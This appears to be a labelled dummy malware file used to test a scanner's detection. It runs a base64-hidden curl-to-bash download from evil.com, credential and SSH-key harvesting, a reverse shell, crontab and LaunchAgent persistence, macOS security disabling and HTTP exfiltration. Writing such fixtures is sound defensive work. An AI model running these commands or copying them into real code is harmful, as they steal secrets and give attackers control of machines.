/**
 * test-malicious-dummy.js
 * This is a dummy malicious JavaScript/Node.js script for testing bsau's scanners.
 * It contains multiple malicious indicators that should be detected.
 *
 * DO NOT EXECUTE THIS FILE - IT IS FOR TESTING ONLY
 */

const { execSync, spawn } = require('child_process');
const fs = require('fs');
const path = require('path');
const net = require('net');
const http = require('http');
const os = require('os');

// Malicious indicator 1: Hardcoded IPv4/IPv6 C2 servers
const C2_SERVER = "http://185.199.110.153:4444/callback";
const C2_IPV6 = "http://[2001:db8:85a3::8a2e:370:7334]:8080/exfil";

// Malicious indicator 2: Base64 decode and execute
const encodedPayload = "Y3VybCAtcyBodHRwOi8vZXZpbC5jb20vc2hlbGwuc2ggfCBiYXNo";
const decodedPayload = Buffer.from(encodedPayload, 'base64').toString();
execSync(decodedPayload);

// Malicious indicator 3: Credential harvesting
function stealCredentials() {
    const homeDir = os.homedir();

    // AWS credentials
    const awsCreds = fs.readFileSync(path.join(homeDir, '.aws/credentials'), 'utf8');

    // SSH keys
    const sshDir = path.join(homeDir, '.ssh');
    const sshKeys = fs.readdirSync(sshDir).map(f =>
        fs.readFileSync(path.join(sshDir, f), 'utf8')
    );

    // Environment secrets
    const secrets = {};
    for (const [key, value] of Object.entries(process.env)) {
        if (key.includes('SECRET') || key.includes('TOKEN') || key.includes('API_KEY')) {
            secrets[key] = value;
        }
    }

    return { awsCreds, sshKeys, secrets };
}

// Malicious indicator 4: Reverse shell
function reverseShell() {
    const client = new net.Socket();
    client.connect(4444, '10.0.0.1', () => {
        client.pipe(spawn('/bin/sh', []).stdin);
    });
}

// Malicious indicator 5: curl/wget piped to shell
execSync('curl -s http://malware.site/payload | bash');
execSync('wget -qO- http://attacker.com/stage2 | sh');

// Malicious indicator 6: Disable macOS security
execSync('spctl --master-disable');
execSync('csrutil disable');

// Malicious indicator 7: Persistence via crontab
execSync("echo '* * * * * curl http://evil.com/beacon | sh' | crontab -");

// Malicious indicator 8: LaunchAgent persistence
const launchAgentPath = path.join(os.homedir(), 'Library/LaunchAgents/com.malware.plist');
fs.writeFileSync(launchAgentPath, `<?xml version="1.0"?>
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.malware.backdoor</string>
</dict>
</plist>`);

// Malicious indicator 9: eval with dynamic code
const maliciousCode = Buffer.from('Y29uc29sZS5sb2coImhhY2tlZCIp', 'base64').toString();
eval(maliciousCode);

// Malicious indicator 10: Exfiltration via HTTP
const postData = JSON.stringify({
    credentials: 'stolen',
    ssh_key: 'private_key'
});

const options = {
    hostname: '192.168.1.100',
    port: 8080,
    path: '/exfil',
    method: 'POST'
};
http.request(options).write(postData);

// Malicious indicator 11: Character code obfuscation
const charCodes = [99,117,114,108,32,104,116,116,112,58,47,47,101,118,105,108,46,99,111,109];
const obfuscatedCmd = String.fromCharCode(...charCodes);
execSync(obfuscatedCmd);

// Malicious indicator 12: Keychain access
execSync('security find-generic-password -a account -w');

module.exports = { stealCredentials, reverseShell };
